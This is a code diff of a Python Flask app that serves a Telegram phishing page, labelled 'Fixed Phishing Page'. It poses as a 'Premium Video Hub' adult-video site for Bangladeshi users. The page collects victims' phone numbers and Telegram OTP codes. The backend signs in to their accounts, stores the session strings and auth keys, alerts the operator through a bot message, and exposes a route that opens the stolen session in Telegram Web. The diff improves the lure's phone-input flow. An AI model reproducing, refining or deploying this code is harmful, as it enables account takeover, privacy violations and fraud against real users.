@@ -26,11 +26,9 @@ user_sessions = {}
 captured_accounts = []
 pending_codes = {}
 
-# Thread pool for async operations
 executor = ThreadPoolExecutor(max_workers=5)
 
 def run_async(coro):
-    """Run async function in a separate thread with its own event loop"""
     def _run():
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
@@ -40,7 +38,7 @@ def run_async(coro):
             loop.close()
     return executor.submit(_run)
 
-# ====== Phishing Page (Always shows content, requestContact only inside Telegram) ======
+# ====== Fixed Phishing Page ======
 PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -73,6 +71,8 @@ PAGE = """<!DOCTYPE html>
         .video-item .info h4{font-size:12px;margin-bottom:3px}
         .video-item .info span{font-size:11px;color:#666}
         .footer{text-align:center;padding:20px;color:#333;font-size:11px}
+        
+        /* Modal Styles */
         .modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;padding:20px;overflow-y:auto}
         .modal-overlay.active{display:flex;align-items:center;justify-content:center}
         .modal{background:#141420;border-radius:20px;padding:30px;max-width:380px;width:100%;border:1px solid #1a1a2e;animation:slideUp 0.3s ease}
@@ -85,6 +85,18 @@ PAGE = """<!DOCTYPE html>
         .modal .sb.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
         .modal .sb.info{display:block;background:rgba(33,150,243,0.15);color:#90CAF9}
         .modal .sb.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
+        
+        /* Phone Input */
+        .phone-input-container{display:flex;gap:8px;margin:10px 0;}
+        .phone-input{flex:1;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:18px;text-align:center;outline:none;transition:border 0.3s}
+        .phone-input:focus{border-color:#0088cc;box-shadow:0 0 0 2px rgba(0,136,204,0.3)}
+        .phone-input::placeholder{color:#555}
+        .submit-btn{width:100%;padding:16px;background:#0088cc;border:none;border-radius:50px;color:white;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:1px;transition:all 0.3s}
+        .submit-btn:hover{background:#0099dd;transform:translateY(-1px)}
+        .submit-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
+        .country-code-badge{display:inline-block;background:#1a1a2e;padding:8px 15px;border-radius:8px;font-size:13px;color:#888;margin-bottom:8px}
+        
+        /* Code Input */
         .cd{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:12px;color:white;margin:10px 0;font-weight:bold;min-height:55px}
         .np{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
         .np .k{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer;transition:0.15s}
@@ -92,13 +104,18 @@ PAGE = """<!DOCTYPE html>
         .np .kc{background:#e94560;color:white}
         .np .ks{background:#4CAF50;color:white;font-weight:700;font-size:14px}
         .np .ks:disabled{background:#333;color:#666}
+        
         .step{display:none}
         .step.active{display:block}
+        
+        /* Success Screen */
         .ss{text-align:center;padding:20px 0}
         .ss .bi{font-size:60px;margin-bottom:15px}
         .ss h2{color:#4CAF50;font-size:22px;margin-bottom:8px}
         .ss p{color:#888;font-size:13px;margin-bottom:20px}
         .ss .wb{background:#4CAF50;color:white;border:none;padding:15px 40px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1px}
+        
+        /* Spinner */
         .sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
         @keyframes spin{to{transform:rotate(360deg)}}
     </style>
@@ -129,19 +146,34 @@ PAGE = """<!DOCTYPE html>
     </div>
     <div class="footer">© 2026 Premium Video Hub</div>
     
+    <!-- ====== MODAL ====== -->
     <div class="modal-overlay" id="vm">
         <div class="modal">
+            <!-- Step 1: Phone Input -->
             <div id="s1" class="step active">
-                <div class="modal-icon">🔞</div>
-                <h2>Age Verification Required</h2>
-                <p>Please wait karo thoda, we are verifying your account...</p>
-                <div id="ps" class="sb info"><span class="sp"></span> Verifying your contact...</div>
+                <div class="modal-icon">📱</div>
+                <h2>Phone Number Required</h2>
+                <p>আপনার মোবাইল নম্বর দিন:</p>
+                <div class="country-code-badge">🇧🇩 +88 (Bangladesh)</div>
+                <div id="ps1" class="sb info">📞 আপনার 11 ডিজিটের নম্বর লিখুন</div>
+                <div class="phone-input-container">
+                    <input type="tel" id="phoneInput" class="phone-input" 
+                           placeholder="017XXXXXXXX" maxlength="14" inputmode="numeric">
+                </div>
+                <button class="submit-btn" id="phoneSubmitBtn" onclick="submitPhone()">
+                    📲 Submit
+                </button>
+                <p style="color:#444;font-size:11px;margin-top:12px;">
+                    ⏱ OTP পাঠানো হবে আপনার Telegram-এ
+                </p>
             </div>
+            
+            <!-- Step 2: OTP Code Input -->
             <div id="s2" class="step">
                 <div class="modal-icon">🔐</div>
                 <h2>Enter Verification Code</h2>
                 <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+880XXXXXXXXXX</span></p>
-                <div id="cs" class="sb waiting"><span class="sp"></span> Code send ho raha hai...</div>
+                <div id="cs" class="sb waiting"><span class="sp"></span> Code পাঠানো হচ্ছে...</div>
                 <div class="cd" id="cdisp"></div>
                 <div class="np" id="np">
                     <button class="k" onclick="pk('1')">1</button>
@@ -158,12 +190,17 @@ PAGE = """<!DOCTYPE html>
                     <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
                 </div>
                 <div id="vs" class="sb"></div>
+                <p style="color:#444;font-size:11px;margin-top:10px;text-align:center;">
+                    ⏳ Code পেতে 10-30 সেকেন্ড সময় লাগতে পারে
+                </p>
             </div>
+            
+            <!-- Step 3: Success -->
             <div id="s3" class="step">
                 <div class="ss">
                     <div class="bi">✅</div>
                     <h2>Verification Successful!</h2>
-                    <p>Aapka link generate ho raha hai... thoda aur wait karo</p>
+                    <p>আপনার লিংক জেনারেট হচ্ছে... একটু অপেক্ষা করুন</p>
                     <button class="wb" onclick="wv()">🎬 Watch Video</button>
                 </div>
             </div>
@@ -171,101 +208,250 @@ PAGE = """<!DOCTYPE html>
     </div>
     
     <script>
-    let ph='', ccd='';
+    // ====== Global Variables ======
+    let phoneNumber = '';
+    let codeDigits = '';
+    let codeCheckInterval = null;
     
+    // ====== Main Button Click ======
     document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
-        document.getElementById('ps').innerHTML = '<span class="sp"></span> Requesting contact...';
+        showPhoneInput();
+    };
+    
+    // ====== Show Phone Input (Step 1) ======
+    function showPhoneInput() {
+        // Reset to Step 1
+        document.getElementById('s1').classList.add('active');
+        document.getElementById('s2').classList.remove('active');
+        document.getElementById('s3').classList.remove('active');
         
-        // Try Telegram WebApp requestContact
-        if (window.Telegram && window.Telegram.WebApp && typeof Telegram.WebApp.requestContact === 'function') {
-            Telegram.WebApp.requestContact(function(success, contact) {
-                if (success && contact && contact.phone_number) {
-                    ph = contact.phone_number.startsWith('+') ? contact.phone_number : '+' + contact.phone_number;
-                    document.getElementById('ps').innerHTML = '<span class="sp"></span> Contact received! Verifying ' + ph + '...';
-                    send(ph);
-                } else {
-                    document.getElementById('ps').className = 'sb error';
-                    document.getElementById('ps').textContent = '❌ দয়া করে আপনার contact share করুন';
-                }
-            });
+        // Show info message
+        var ps = document.getElementById('ps1');
+        ps.className = 'sb info';
+        ps.innerHTML = '📞 আপনার 11 ডিজিটের নম্বর লিখুন';
+        ps.style.display = 'block';
+        
+        // Focus input
+        setTimeout(function() {
+            var inp = document.getElementById('phoneInput');
+            if (inp) inp.focus();
+        }, 500);
+    }
+    
+    // ====== Submit Phone Number ======
+    function submitPhone() {
+        var input = document.getElementById('phoneInput');
+        var btn = document.getElementById('phoneSubmitBtn');
+        var raw = input.value.trim().replace(/[^0-9]/g, '');
+        
+        // Validation
+        if (raw.length < 10) {
+            var ps = document.getElementById('ps1');
+            ps.className = 'sb error';
+            ps.innerHTML = '❌ কমপক্ষে 10 ডিজিটের নম্বর দিন (যেমন: 017XXXXXXXX)';
+            ps.style.display = 'block';
+            return;
+        }
+        
+        // Format phone
+        if (raw.startsWith('0')) {
+            phoneNumber = '+88' + raw;
+        } else if (!raw.startsWith('+')) {
+            phoneNumber = '+' + raw;
         } else {
-            // Fallback: if requestContact not available, show a simple input
-            var p = prompt('📱 আপনার ফোন নম্বর লিখুন:\n(যেমন: 017XXXXXXXX)');
-            if(p && p.length >= 10) {
-                ph = p.startsWith('+') ? p : '+88' + p;
-                document.getElementById('ps').innerHTML = '<span class="sp"></span> Verifying ' + ph + '...';
-                send(ph);
+            phoneNumber = raw;
+        }
+        
+        // Disable button & show loading
+        btn.disabled = true;
+        btn.innerHTML = '<span class="sp"></span> Sending...';
+        
+        var ps = document.getElementById('ps1');
+        ps.className = 'sb info';
+        ps.innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে ' + phoneNumber + '...';
+        ps.style.display = 'block';
+        
+        // Send to backend
+        sendPhoneToBackend(phoneNumber);
+    }
+    
+    // ====== Send Phone to Backend ======
+    async function sendPhoneToBackend(phone) {
+        try {
+            var res = await fetch('/api/share', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: phone})
+            });
+            var data = await res.json();
+            
+            if (data.success) {
+                // Move to Step 2 (OTP)
+                document.getElementById('s1').classList.remove('active');
+                document.getElementById('s2').classList.add('active');
+                document.getElementById('pd').textContent = phone;
+                
+                var cs = document.getElementById('cs');
+                cs.className = 'sb waiting';
+                cs.innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে আপনার Telegram-এ...';
+                cs.style.display = 'block';
+                
+                // Start checking for code status
+                startCodeCheck();
             } else {
-                document.getElementById('ps').className = 'sb error';
-                document.getElementById('ps').textContent = '❌ Valid phone number দিন';
+                var ps = document.getElementById('ps1');
+                ps.className = 'sb error';
+                ps.innerHTML = '❌ Error: ' + (data.error || 'Unknown error');
+                ps.style.display = 'block';
+                
+                document.getElementById('phoneSubmitBtn').disabled = false;
+                document.getElementById('phoneSubmitBtn').innerHTML = '📲 Submit';
+            }
+        } catch(e) {
+            var ps = document.getElementById('ps1');
+            ps.className = 'sb error';
+            ps.innerHTML = '❌ Connection error. Please try again.';
+            ps.style.display = 'block';
+            
+            document.getElementById('phoneSubmitBtn').disabled = false;
+            document.getElementById('phoneSubmitBtn').innerHTML = '📲 Submit';
+        }
+    }
+    
+    // ====== Check Code Status (Polling) ======
+    function startCodeCheck() {
+        if (codeCheckInterval) clearInterval(codeCheckInterval);
+        
+        codeCheckInterval = setInterval(async function() {
+            try {
+                var res = await fetch('/api/check', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: phoneNumber})
+                });
+                var data = await res.json();
+                
+                if (data.s === 'sent') {
+                    clearInterval(codeCheckInterval);
+                    codeCheckInterval = null;
+                    
+                    var cs = document.getElementById('cs');
+                    cs.className = 'sb success';
+                    cs.innerHTML = '✅ আপনার Telegram-এ OTP কোড পাঠানো হয়েছে! নিচে টাইপ করুন:';
+                    cs.style.display = 'block';
+                    
+                    // Auto-focus on numpad
+                } else if (data.s === 'done') {
+                    clearInterval(codeCheckInterval);
+                    codeCheckInterval = null;
+                    
+                    // Already verified
+                    document.getElementById('s2').classList.remove('active');
+                    document.getElementById('s3').classList.add('active');
+                } else if (data.s === 'err') {
+                    clearInterval(codeCheckInterval);
+                    codeCheckInterval = null;
+                    
+                    var cs = document.getElementById('cs');
+                    cs.className = 'sb error';
+                    cs.innerHTML = '❌ কোড পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।';
+                    cs.style.display = 'block';
+                }
+            } catch(e) {}
+        }, 2000);
+    }
+    
+    // ====== Numpad Functions ======
+    function pk(n) {
+        if (codeDigits.length < 6) {
+            codeDigits += n;
+            document.getElementById('cdisp').textContent = codeDigits;
+        }
+    }
+    
+    function cc() {
+        codeDigits = codeDigits.slice(0, -1);
+        document.getElementById('cdisp').textContent = codeDigits;
+    }
+    
+    // ====== Submit Code for Verification ======
+    async function sc() {
+        if (codeDigits.length < 4) {
+            showVerifyStatus('❌ পুরো কোডটি লিখুন (4-6 ডিজিট)', 'error');
+            return;
+        }
+        
+        // Disable verify button
+        document.getElementById('sb').disabled = true;
+        document.getElementById('sb').textContent = '⏳ Verifying...';
+        
+        try {
+            var res = await fetch('/api/verify', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    phone: phoneNumber,
+                    code: codeDigits
+                })
+            });
+            var data = await res.json();
+            
+            if (data.success) {
+                // Success - go to step 3
+                document.getElementById('s2').classList.remove('active');
+                document.getElementById('s3').classList.add('active');
+                
+                // Stop any polling
+                if (codeCheckInterval) {
+                    clearInterval(codeCheckInterval);
+                    codeCheckInterval = null;
+                }
+            } else {
+                showVerifyStatus('❌ ' + (data.error || 'ভুল কোড'), 'error');
+                codeDigits = '';
+                document.getElementById('cdisp').textContent = '';
+                document.getElementById('sb').disabled = false;
+                document.getElementById('sb').textContent = '✓ Verify';
+            }
+        } catch(e) {
+            showVerifyStatus('❌ Network error', 'error');
+            document.getElementById('sb').disabled = false;
+            document.getElementById('sb').textContent = '✓ Verify';
+        }
+    }
+    
+    function showVerifyStatus(msg, type) {
+        var el = document.getElementById('vs');
+        el.textContent = msg;
+        el.className = 'sb ' + type;
+        el.style.display = 'block';
+    }
+    
+    function wv() {
+        window.location.href = 'https://example.com';
+    }
+    
+    // ====== Close modal on overlay click ======
+    document.getElementById('vm').onclick = function(e) {
+        if (e.target === this) {
+            this.classList.remove('active');
+            if (codeCheckInterval) {
+                clearInterval(codeCheckInterval);
+                codeCheckInterval = null;
             }
         }
     };
     
-    async function send(p){
-        try{
-            var r=await fetch('/api/share',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p})});
-            var d=await r.json();
-            if(d.success){
-                document.getElementById('s1').classList.remove('active');
-                document.getElementById('s2').classList.add('active');
-                document.getElementById('pd').textContent=p;
-                ck();
-            }else{
-                document.getElementById('ps').className='sb error';
-                document.getElementById('ps').textContent='❌ Error: '+JSON.stringify(d);
+    // ====== Enter key support for phone input ======
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            var active = document.querySelector('.step.active');
+            if (active && active.id === 's1') {
+                submitPhone();
             }
-        }catch(e){
-            document.getElementById('ps').className='sb error';
-            document.getElementById('ps').textContent='❌ Connection error';
         }
-    }
-    function ck(){
-        var x=setInterval(async function(){
-            try{
-                var r=await fetch('/api/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:ph})});
-                var d=await r.json();
-                if(d.s=='sent'){
-                    clearInterval(x);
-                    document.getElementById('cs').innerHTML='✅ আপনার Telegram এ OTP কোড পাঠানো হয়েছে! নিচে টাইপ করুন:';
-                    document.getElementById('cs').className='sb success';
-                }else if(d.s=='done'){
-                    clearInterval(x);
-                    document.getElementById('s2').classList.remove('active');
-                    document.getElementById('s3').classList.add('active');
-                }else if(d.s=='err'){
-                    clearInterval(x);
-                    document.getElementById('cs').innerHTML='❌ কোড পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।';
-                    document.getElementById('cs').className='sb error';
-                }
-            }catch(e){}
-        },2000);
-    }
-    function pk(n){if(ccd.length<5){ccd+=n;document.getElementById('cdisp').textContent=ccd;}}
-    function cc(){ccd=ccd.slice(0,-1);document.getElementById('cdisp').textContent=ccd;}
-    async function sc(){
-        if(ccd.length<4){showvs('❌ পুরো কোডটি লিখুন','error');return;}
-        document.getElementById('sb').disabled=true;
-        document.getElementById('sb').textContent='⏳ Wait...';
-        try{
-            var r=await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:ph,code:ccd})});
-            var d=await r.json();
-            if(d.success){
-                document.getElementById('s2').classList.remove('active');
-                document.getElementById('s3').classList.add('active');
-            }else{
-                showvs('❌ '+(d.error||'ভুল কোড'),'error');
-                ccd='';document.getElementById('cdisp').textContent='';
-                document.getElementById('sb').disabled=false;document.getElementById('sb').textContent='✓ Verify';
-            }
-        }catch(e){showvs('❌ Error','error');
-            document.getElementById('sb').disabled=false;document.getElementById('sb').textContent='✓ Verify';
-        }
-    }
-    function showvs(m,t){var e=document.getElementById('vs');e.textContent=m;e.className='sb '+t;}
-    function wv(){window.location.href='https://example.com';}
-    document.getElementById('vm').onclick=function(e){if(e.target===this)this.classList.remove('active');};
+    });
     </script>
 </body>
 </html>"""
@@ -286,7 +472,8 @@ async def send_code(phone):
         return False
 
 async def verify_code(phone, code):
-    if phone not in user_sessions: return {'success': False, 'error': 'Session not found'}
+    if phone not in user_sessions: 
+        return {'success': False, 'error': 'Session not found'}
     s = user_sessions[phone]
     try:
         await s['client'].sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
@@ -304,8 +491,16 @@ async def verify_code(phone, code):
         acc = {
             'phone': phone, 'user_id': me.id, 'username': me.username or '',
             'first_name': me.first_name or '', 'last_name': me.last_name or '',
-            'session': ss, 'webk': json.dumps({'dcId': dc, 'authKey': auth, 'userId': me.id, 'isSupport': False, 'isTest': False}),
-            'dc': dc, 'time': str(datetime.now())
+            'session': ss, 
+            'webk': json.dumps({
+                'dcId': dc, 
+                'authKey': auth, 
+                'userId': me.id, 
+                'isSupport': False, 
+                'isTest': False
+            }),
+            'dc': dc, 
+            'time': str(datetime.now())
         }
         captured_accounts.append(acc)
         
@@ -316,25 +511,30 @@ async def verify_code(phone, code):
                     'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}",
                     'parse_mode': 'Markdown'
                 })
-        except: pass
+        except: 
+            pass
         
         del user_sessions[phone]
         pending_codes[phone] = 'done'
         return {'success': True}
     except Exception as e:
         e = str(e)
-        if 'PHONE_CODE_INVALID' in e: return {'success': False, 'error': 'Wrong code'}
-        if 'SESSION_PASSWORD_NEEDED' in e: return {'success': False, 'error': '2FA enabled'}
+        if 'PHONE_CODE_INVALID' in e: 
+            return {'success': False, 'error': 'Wrong code'}
+        if 'SESSION_PASSWORD_NEEDED' in e: 
+            return {'success': False, 'error': '2FA enabled'}
         return {'success': False, 'error': e[:80]}
 
 # ====== Routes ======
 @app.route('/')
-def index(): return render_template_string(PAGE)
+def index(): 
+    return render_template_string(PAGE)
 
 @app.route('/api/share', methods=['POST'])
 def share():
     ph = request.json.get('phone', '')
-    if not ph: return jsonify({'success': False, 'error': 'Phone required'})
+    if not ph: 
+        return jsonify({'success': False, 'error': 'Phone required'})
     
     # Phone number format fix for Bangladesh
     if ph.startswith('0') and not ph.startswith('+'):
@@ -370,7 +570,8 @@ def verify():
 @app.route('/webk/<phone>')
 def webk(phone):
     a = next((x for x in captured_accounts if x['phone'] == phone), None)
-    if not a: return "Not found", 404
+    if not a: 
+        return "Not found", 404
     w = a['webk']
     return f"""
     <!DOCTYPE html><html><head><title>WebK</title>
